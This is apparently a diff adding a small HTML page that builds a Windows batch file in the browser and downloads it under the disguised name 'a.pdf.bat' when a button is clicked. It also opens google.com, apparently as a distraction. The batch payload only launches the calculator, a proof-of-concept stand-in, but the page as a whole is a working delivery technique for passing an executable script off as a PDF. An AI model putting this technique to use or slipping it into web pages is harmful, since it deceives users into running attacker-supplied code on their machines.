@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Blob Only - Auto Download .pdf.bat</title>
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #111;
+      color: #0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    button {
+      background-color: #0f0;
+      color: #111;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Click to download</h2>
+  <button onclick="downloadBlob()">Download .pdf.bat</button>
+
+  <script>
+    function downloadBlob() {
+      const payload = `@echo off\r\nstart calc.exe`;
+      const blob = new Blob([payload], { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+      window.open("http://google.com")
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'a.pdf.bat'; // nama file
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+  </script>
+</body>
+</html>
